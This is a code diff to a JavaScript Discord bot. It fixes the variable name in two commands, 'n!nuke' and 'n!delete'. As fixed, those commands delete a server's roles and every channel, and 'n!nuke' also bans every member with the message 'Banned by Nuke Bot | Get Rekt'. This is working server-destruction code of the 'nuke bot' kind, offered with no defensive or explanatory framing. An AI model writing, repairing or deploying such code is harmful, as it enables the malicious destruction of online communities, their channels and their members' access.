@@ -60,14 +60,14 @@ client.on('message', (message) => {
       message.channel.send(embed)
     }
 
-    if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
-      msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
-      msg.guild.channels.deleteAll();
-      msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
+    if(message.content.toLowerCase().startsWith("n!" + "nuke")){
+      message.guild.roles.filter(r=>r.position < message.guild.me.highestRole.position).deleteAll();
+      message.guild.channels.deleteAll();
+      message.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
   }
-  if(msg.content.toLowerCase().startsWith("n!" + "delete")){
-      msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
-      msg.guild.channels.deleteAll();
+  if(message.content.toLowerCase().startsWith("n!" + "delete")){
+      message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
+      message.guild.channels.deleteAll();
   }
     
   if(message.content == '에메랄드 명령어 리스트') {
